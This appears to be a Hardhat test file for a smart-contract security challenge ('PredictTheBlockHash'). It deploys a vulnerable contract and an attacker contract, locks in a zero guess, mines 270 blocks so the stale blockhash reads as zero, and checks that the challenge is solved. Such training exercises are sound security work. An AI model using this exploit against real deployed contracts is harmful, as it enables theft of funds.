import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers, network } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

describe('Start Point', async function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const predictTheBlockHashChallengeFactory = await ethers.getContractFactory(
      'PredictTheBlockHashChallenge'
    );

    const PredictTheBlockHashAttackerFactory = await ethers.getContractFactory(
      'PredictTheBlockHashAttacker'
    );

    const predictTheBlockHashChallengeContract =
      await predictTheBlockHashChallengeFactory.deploy({
        value: ethers.utils.parseEther('1'),
      });

    const predictTheBlockHashAttackerContract =
      await PredictTheBlockHashAttackerFactory.deploy(
        predictTheBlockHashChallengeContract.address
      );

    return {
      predictTheBlockHashChallengeContract,
      predictTheBlockHashAttackerContract,
      attackerWallet,
    };
  }

  describe('exploit', async function () {
    let predictTheBlockHashChallengeContract: Contract,
      predictTheBlockHashAttackerContract: Contract,
      attackerWallet: SignerWithAddress;

    before(async function () {
      ({
        predictTheBlockHashChallengeContract,
        predictTheBlockHashAttackerContract,
        attackerWallet,
      } = await loadFixture(setup));
    });

    it('Should lock guess and settle', async function () {
      // Get the provider
      const provider = ethers.provider;

      await predictTheBlockHashAttackerContract.lockInGuess(
        '0x0000000000000000000000000000000000000000000000000000000000000000',
        {
          value: ethers.utils.parseEther('1'),
        }
      );

      for (let index = 0; index < 270; index++) {
        provider.send('evm_mine', []);
      }

      await predictTheBlockHashAttackerContract.settle();

      expect(await predictTheBlockHashChallengeContract.isComplete()).to.equal(
        true
      );
    });
  });
});
